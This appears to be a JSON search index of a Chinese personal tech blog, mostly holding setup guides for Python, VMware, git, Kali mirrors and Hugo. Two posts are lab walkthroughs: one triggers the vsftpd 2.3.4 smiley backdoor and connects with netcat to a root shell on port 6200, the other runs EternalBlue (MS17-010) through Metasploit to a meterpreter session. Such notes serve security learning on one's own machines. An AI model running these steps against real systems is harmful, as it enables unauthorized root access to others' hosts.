[{"content":"介绍： VSFTP是一个基于GPL发布的类Unix系统上使用的FTP服务器软件，它的全称是Very Secure FTP 。\nvsftpd-2.3.4早期版本存在恶意的后门，通过登录名中嵌入 :) 两个连续符号而触发的漏洞，因外形酷似笑脸而得名。\n演示   扫描目的主机\n打开kali使用nmap对目的主机进行扫描(目的主机地址为192.168.43.9)\nnmap --script ftp-vsftpd-backdoor 192.168.43.9 \r\n  触发笑脸漏洞\n在命令行里接着用ftp尝试登录目的主机\nftp 192.168.43.9\r\r\n这里提示我们输入用户名，我们目的是拿到最高权限，即用root账户登录靶机\n用户名我们输入root：）\n密码随便输入后点击回车等待\n\r\n  开始渗透靶机\n打开一个新的命令行，用nc连接靶机\nnc 192.168.43.9 6200\r回车后现在就已经连接上了靶机\n\r\n验证下是否渗透成功\n输入id查看当前登录用户\n\r\n看到确实是root用户登录\n  ","date":"2021-06-13T18:45:05+08:00","image":"https://example.com/p/vsftp%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/img_hu3c4bac59db6a4cce36061fc2e33d537b_112203_120x120_fill_q75_box_smart1.jpg","permalink":"https://example.com/p/vsftp%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/","title":"vsftp笑脸漏洞"},{"content":"永恒之蓝漏洞渗透测试   开启渗透测试工具msfconsole\n打开终端输入msfconsole回车\n  \r\n 找到永恒之蓝漏洞\n搜索永恒之蓝漏洞代号ms17-010\nsearch ms17-010\r  \r\n这里2号就是我们要找的漏洞\n选择这个漏洞\nuse 2\r\r\n 设置添加字段\n可以使用show options查看当前漏洞的可选选项\n  \r\n这里有两个必须添加的字段：RHOSTS和RPORT\nset rhosts 192.168.43.252\rset rport 445\r\r\n 开始渗透\n输入run 或 explit开始渗透\n\r\n当看到meterpreter即为成功，现在就可以像操作目标主机的命令行一样操作主机了\n例如，屏幕分享\nscreenshare\r\r\n这时会打开浏览器将目的主机的页面实时显示在浏览器页面\n  \r\n","date":"2021-06-13T18:28:05+08:00","image":"https://example.com/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/img_hub750baee38adda461d7ae16c1ed35a00_24449_120x120_fill_q75_box_smart1.jpg","permalink":"https://example.com/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/","title":"永恒之蓝"},{"content":"python虚拟环境 1. 什么是虚拟环境 ​\tpython虚拟环境是独立于已经安装的python环境的环境，各个环境之间互不影响。比如我正在学习python爬虫，我可以创建一个名为spider的虚拟环境专门放置与爬虫有关的包，过段时间我学习Django，可以创建一个名为dj的环境安装Django。\n​\t不仅仅是方便管理，虚拟环境还能减少环境冲突和包之间的冲突以及其他不必要的麻烦，比如以下场景：\n  项目A使用的是Django1.9，而项目B需要Django2.1\n  项目A使用python2.7，项目B使用python3.8\n  2. 虚拟环境管理包（virtualenvwrapper） 2.1 下载管理包 打开命令行，用pip安装virtualenvwrapper\n  Windows下：\npip install virtualenvwrapper-win   linux下：\npip install virtuallenvwrapper   2.2 常用操作   创建虚拟环境（创建后会自动进入创建的虚拟环境）\nmkvirtualenv \u0026lt;name\u0026gt; 为虚拟环境的名称\n  退出虚拟环境\ndeactivate   进入虚拟环境\nworkon \u0026lt;name\u0026gt; 进入虚拟环境后用pip安装python包只会安装在该虚拟环境下\n  删除虚拟环境\nrmvirtualenv \u0026lt;name\u0026gt;   3. 第三房包管理工具（anaconda） 3.1 下载anaconda 下载地址：https://www.anaconda.com/download/\n3.2 常用操作   环境操作\n  创建虚拟环境\nconda create -n \u0026lt;name\u0026gt; python=3.6 或\nconda create --name \u0026lt;name\u0026gt; python=3.6 可以通过python \u0026ndash;version查看python版本\n  切换、进入虚拟环境\nactivate \u0026lt;name\u0026gt;   卸载虚拟环境\nconda remove --name \u0026lt;name\u0026gt; --all   查看所有的虚拟环境\nconda env list     包操作\n  安装包\nconda install \u0026lt;name\u0026gt; 或\npip install \u0026lt;name\u0026gt;   卸载包\nconda remove \u0026lt;name\u0026gt; 或\npip uninstall \u0026lt;name\u0026gt;   查看当前环境下所有的包\nconda list   删除指定环境下所有的包\nconda remove -n \u0026lt;name\u0026gt; --all   更新指定的包\nconda update \u0026lt;name\u0026gt;     4. 更改虚拟环境的路径   添加环境变量\n变量名：WORKON_HOME\n变量值：虚拟环境路径\n\r\n  修改虚拟环境配置文件\n打开python的安装目录下的Scripts文件夹，找到mkvirtualenv.bat文件\n\r\n右击，点击编辑，找到第24行的\nset \u0026ldquo;venvwrapper.default_workon_home=%USERPROFILE%\\Envs\u0026rdquo;\n修改为\nset \u0026ldquo;venvwrapper.default_workon_home=%WORKON_HOME%\\Envs\u0026rdquo;\n\r\n此后使用mkvirtualenv创建的虚拟环境将会创建在D:env/Pyenv下\n  ","date":"2021-05-16T17:43:02+08:00","image":"https://example.com/p/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/img_hu6192449d6c32252b9ae84826e0ae15a6_21357_120x120_fill_box_smart1_2.png","permalink":"https://example.com/p/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/","title":"Python虚拟环境"},{"content":"Windows下的安装   进入python官方下载页面下载合适版本的Python\n\r\n  双击运行，勾选Add Python 3.6 to PATH，并选择第二项自定义安装Python\n\r\n勾选的选项为给Python添加环境变量，这一步很重要，若此处忘记勾选，安装成功后也要手动添加环境变量\n  检查是否全部勾选，点击下一步\n\r\n  勾选Install for all users，然后选择合适的安装路径，点击下一步\n\r\n  点击install弹出的提示框中点击是，则开始安装\n\r\n  安装成功后点击close关闭安装窗口，打开命令行检查是否安装成功，输入python后回车\n\r\n至此，Python3.6安装成功\n  Linux下的安装 Linux自带Python环境，但版本较低，不太适合现在的开发\napt安装   打开终端输入\nsudo apt-get install python3.6   下载pip包管理工具\nlinux下载的python不会附带pip包管理工具的安装，需要额外手动安装\nsudo apt-get install python3-pip   离线包解压安装  下载Linux版python包 解压 安装 安装pip  ","date":"2021-05-09T17:55:19+08:00","image":"https://example.com/p/python%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/img_hu85a1865f4ffedb1cc044550c2ed2076f_451620_120x120_fill_q75_box_smart1.jpg","permalink":"https://example.com/p/python%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/","title":"Python开发环境配置"},{"content":"VMware Tools的安装 VMware Tools是VMware虚拟机的增强功能，在VMware的虚拟机内安装VMware tools能够大大提升我们操作虚拟机的体验\n  显著提升虚拟机的性能\n主要为图形显示性能，例如鼠标卡顿\n  实现自适应窗口大小\n当调整VMware窗口大小时，内部的虚拟机可以自动调整分辨率来适应窗口\n  实现虚拟机、宿主机文件拖拽\n最实用的功能，不必解释\n  Windows下的安装 vmware对Windows有良好的支持，得益于Windows的图形化操作界面，Windows系统安装VMware是最容易的，具体步骤如下（此处以Windows LTSC为例）：\n  安装好Windows虚拟机后，在选项栏选择 workstation/虚拟机/安装VMware Tools\n\r\n  打开此电脑发现检测到驱动器，双击运行\n\r\n  开始安装，无脑下一步即可\n\r\n  安装完成后虚拟机界面可能会有缩放，说明VMware安装成功，重启虚拟机\n\r\n  Linux下的安装 ​\tLinux需要借助命令行进行安装（最新版的Ubuntu20.4图形化操作貌似已可以实现）\nkali Linux如果是虚拟机版会自带VMwareTools\n  在选项栏选择 workstation/虚拟机/安装VMware Tools，应用栏会出现一个DVD图标，点进去\n\r\n  将里面的.tar.gz安装包复制出来\n\r\n  解压刚刚复制出来的压缩包\ntar -xzvf [.tar.gz压缩包文件名] \r\n  在解压后的目录的根目录里打开终端，运行\nsudo ./vmware-install.pl \r\n  输入密码后开始安装，安装过程会有停顿大概分以下三种操作\n 输入密码后的第一个提示输入yes后回车 有[yes]或者[no]根据提示输入yes或no回车 只有路径没有提示则直接回车，直到出现enjoy。  \r\n\r\n  安装成功后重启虚拟机就OK了。\n  macOS下的安装 macOS在点击“安装VMwareTools”时可能会出现报错，系统无法读取到VMware Tools镜像，需要自己下载Mac系统的VMwareTools镜像安装。\n  下载VMwareTools镜像\n链接：https://wwe.lanzoui.com/iObPYp4mr0d\n  打开虚拟机设置，在CD/DVD的连接一栏将VMwareTools安装镜像导进去（此时虚拟机为关机状态）\n\r\n  打开macOS，发现桌面出现镜像文件则导入成功，双击运行\n\r\n  安装期间需要输入账户密码\n打开设置、安全与隐私，将左下角的锁点开，再选择App Store认可的安装\n  ","date":"2021-05-09T17:39:00+08:00","image":"https://example.com/p/vmware-tools%E7%9A%84%E5%AE%89%E8%A3%85/img_hudf3bcae802c9d93c2b6db0275eae5d12_19026_120x120_fill_box_smart1_2.png","permalink":"https://example.com/p/vmware-tools%E7%9A%84%E5%AE%89%E8%A3%85/","title":"VMware Tools的安装"},{"content":"1. apt安装 需要知道需要安装的软件在apt源中的包名\n命令\nsudo apt-get install \u0026lt;软件名\u0026gt; 卸载\nsudo apt-get remove \u0026lt;软件名\u0026gt; 2. deb包安装 deb包是基于Debian linux的发行版的软件安装包，其中，Ubuntu、kali都是基于Debian的linux发行版\n2.1 下载要安装的deb包 以VScode为例，桌面上是一个已经下载好的vscodedeb安装包\n\r\n2.3 命令行安装 在deb包所在位置打开终端，执行安装命令\nsudo dpkg -i \u0026lt;包名\u0026gt;\r\r\n2.4 添加快捷方式 安装好之后，不会像Windows一样自动创建桌面快捷方式，需要手动创建\n首先找到安装好的VScode，点开左上角的kali图标，搜索\n\r\n拖动到桌面就可以，此时deb安装包可以删除了\n\r\n","date":"2021-05-07T18:45:05+08:00","image":"https://example.com/p/linux%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/img_hub8d777d81c0e7b557f4ca544fbad5674_6597_120x120_fill_box_smart1_2.png","permalink":"https://example.com/p/linux%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/","title":"linux安装软件"},{"content":"git环境部署   本地安装git\n去git官网下载git软件，安装过程无脑下一步就行\n安装成功后在鼠标右击目录下会多出两项\n\r\nGit GUI：图形界面的Git，不建议初学者使用，尽量先熟悉常用命令\nGit Bash：Unix与Linux风格的命令行，使用最多，推荐最多\n  设置用户名和邮箱\n你需要告诉本地git软件，你是一个有用户名、有邮箱的合法用户，若不设置，commit时会阻止提交到本地仓库\ngit config --global user.name \u0026#34;用户\u0026#34; git config --global user.email 邮箱   搭建本地仓库\n有两种方式：\n  文件夹初始化成本地仓库\n新建一个文件夹，作为本地仓库，即工作目录，右击选择Git Bash Here，执行初始化命令\ngit init   克隆远程仓库\n将远程服务器上的仓库复制一份至本地\ngit clone [url]     使用码云\n生成公钥\n 进入用户文件夹，比如 C:\\Users\\Administrator，找到.ssh文件夹 进入.ssh文件夹，文件夹内右击选择Git Bash Here 执行 ssh-keygen 生成公钥，此时文件夹内会生成两个文件id_rsa和id_rsa.pub  设置公钥\n 打开设置  \r\n  进入SSH公钥选项\n\r\n  将刚刚生成的id_rsa.pub文件里的公钥复制到这里\n\r\n    关联远程仓库\ngit remote add gitee https://gitee.com/code_from_cjj/pycode.git 命令解析\n  remote add：添加远程仓库\n  gitee ：给远程仓库起个名称叫gitee\n  https://gitee.com/code_from_cjj/pycode.git：远程仓库的地址\n    后续操作\n以上操作完成后，在此工作目录下的改动都可以提交到本地或者远程的仓库中了\n  添加到暂存区\n  git add .\n - 提交到本地仓库\r```shell\rgit commit -m \u0026quot;\u0026quot;\r  提交到远程仓库\ngit push gitee master     ","date":"2021-04-26T21:28:38+08:00","image":"https://example.com/p/git%E6%93%8D%E4%BD%9C/img_hu15178abcc99e7f0d39fea70d947db705_25539_120x120_fill_box_smart1_2.png","permalink":"https://example.com/p/git%E6%93%8D%E4%BD%9C/","title":"git操作"},{"content":"虚拟机桥接模式 桥接模式就是将主机网卡与虚拟机的网卡利用虚拟网桥进行通信。\n在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。\n在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致\n桥接模式配置 查看需要桥接的网卡   右击右下角网络图标点击打开网络和Internet设置\r1\r\n  下滑找到查看网络属性\r2\r\n  找到正在使用的网卡\n比如我现在正在使用无线网络，到这里找到有关于此网络的信息，包括我们现在要找的无线网卡名称\n\r3\r\n  设置桥接网卡 打开vmware，点击编辑、虚拟网络编辑器，将桥接的网卡设置成刚刚查看到的网卡\n\r4\r\n注：若系统账户不是Administrator，会提示权限不够，打开VMware时右击以管理员身份运行就可以了\n虚拟机内部网IP配置 以Ubuntu20.04为例\n 点击右上角的网络图标、有线、有线设置  \r\n 在有线一栏点击齿轮、IPV4\n\r\n  开始配置IP\n IPV4方式：手动 地址：  地址：设置成与宿主机同一网段下的其他IP地址 子网掩码：与宿主机保持一致 网关：与宿主机保持一致   DNS：与宿主机保持一致 路由：自动就好    校园网的桥接问题 如果宿主机连接的是类似校园网这种需要认证的网络时，会有如下问题：\n  设置虚拟机内的IP地址时，除了宿主机的IP地址，其他的地址均无法上网\n  如果虚拟机设置成宿主机一样的IP，会导致宿主机无法正常连接网络\n  造成这种现象的原因是：虚拟机桥接网络时，这个虚拟机就相当于连接校园网的另一台主机，这台主机也需要像宿主机一样通过认证才允许连接网络\n我的解决办法是，让手机连接校园网的同时开启热点，让宿主机连接手机热点，这样便能正常进行桥接了\n","date":"2021-04-25T22:58:38+08:00","image":"https://example.com/p/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/img_hu2d67d7de06703bec5bb28165f3242d01_51442_120x120_fill_q75_box_smart1.jpg","permalink":"https://example.com/p/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/","title":"桥接模式"},{"content":"换源   打开kali的终端\n\r1\r\n  编辑软件源，输入\nsudo vi /etc/apt/sources.list \r2\r\n  如果是非root的普通账户，会提示需要输入登录密码（2020版本后的默认用户kali也是普通用户），输入密码后回车进入软件源页面\n\r3\r\n  点击键入 i 进入编辑模式（此时窗口左下角会显示INSERT或插入），注释掉官方源\n\r4\r\n  添加国内源\n阿里云：\ndeb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb http://mirrors.aliyun.com/kali-security kali-rolling/updates main contrib non-free 中科大：\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib \r5\r\n  按Esc退出编辑模式，然后输入:wq（保存并退出），回车\n\r6\r\n  至此，换源操作已完成\n更新软件和软件源   输入sudo apt-get dist-upgrade进行软件源清单更新，输入密码后回车\n\r7\r\n  输入sudo apt-get update，进行软件版本更新\n\r8\r\n  更新完成后再输入sudo apt-get upgrade进行更新\n\r9\r\n此时输入y回车即可\n  第一次更新时间比较长，耐心等待更新完成，就可以了\n","date":"2021-04-24T22:38:06+08:00","image":"https://example.com/p/linux%E6%8D%A2%E6%BA%90/img_hu43e51c4064de8073a7912df9d256b142_21327_120x120_fill_q75_box_smart1.jpg","permalink":"https://example.com/p/linux%E6%8D%A2%E6%BA%90/","title":"linux换源"},{"content":"环境部署   安装git\nsudo apt-get install git   安装hugo\nsudo apt-get install hugo   项目搭建   创建hugo 项目\nhugo new site myblog 注：\n myblog为创建的hugo项目的根目录名称    克隆一个主题\ncd myblog git clone https://github.com/vaga/hugo-theme-m10c.git themes/m10c 注：\n 如果cd到项目根目录，clone的地址后面需加上路径 “themes/主题名” 如果cd到themes目录，直接git clone 地址    新建一个博客\nhugo new post/blog.md 注：\n 在post目录下新建一个名为blog.md的博客文件 .md为Markdown格式的文件    修改配置文件\nbaseURL = \u0026quot;https://tian_828.gitee.io/\u0026quot;\rlanguageCode = \u0026quot;zh-cn\u0026quot;\rtitle = \u0026quot;靖哥的博客\u0026quot;\rtheme = \u0026quot;m10c\u0026quot;\r注：\n baseURL：需要部署到云端的地址 languageCode：语言，英文为en，中文为zh-cn title：标题，浏览器标签栏将会显示的内容 theme：此项目所使用的主题的名称，必须与themes目录下的主题文件夹的名称一致    编译\nhugo -D 注：\n 此操作将整个项目编译成能够在浏览器显示的网页 编译后会生成一个public文件夹，里面便是博客网页相关的文件    本地启动\nhugo server -D 或\nhugo server -t m10c --buildDrafts 注：\n  -t：主题，themes文件夹下的主题文件夹名称\n  指定地址：\nhugo --theme=m10c --baseURL=\u0026#34;https://cjj.github.io\u0026#34; --buildDrafts     部署到码云或GitHub   将生成public文件夹的内容推到远程仓库\ncd public/ git init git commit -m \u0026#34; \u0026#34; git remote add blog https://gitee.com/code_from_cjj/blog.git git push -u blog master   或者直接将整个项目目录推到远程仓库\ncd myblog cd .. git init git commit -m \u0026#34; \u0026#34; git remote add blog https://gitee.com/code_from_cjj/blog.git git push -u blog master   注：\n  第二种方式在部署的时候部署目录一定要到达public文件夹，如：\n/myblog/public\n  第一种方式无需设置部署目录，默认就好\n  ","date":"2021-04-24T21:05:28+08:00","image":"https://example.com/p/hugo/hugo_hue75e5db0bb1bfcf964e064a839d1440c_35355_120x120_fill_q75_box_smart1.jpg","permalink":"https://example.com/p/hugo/","title":"Hugo"}]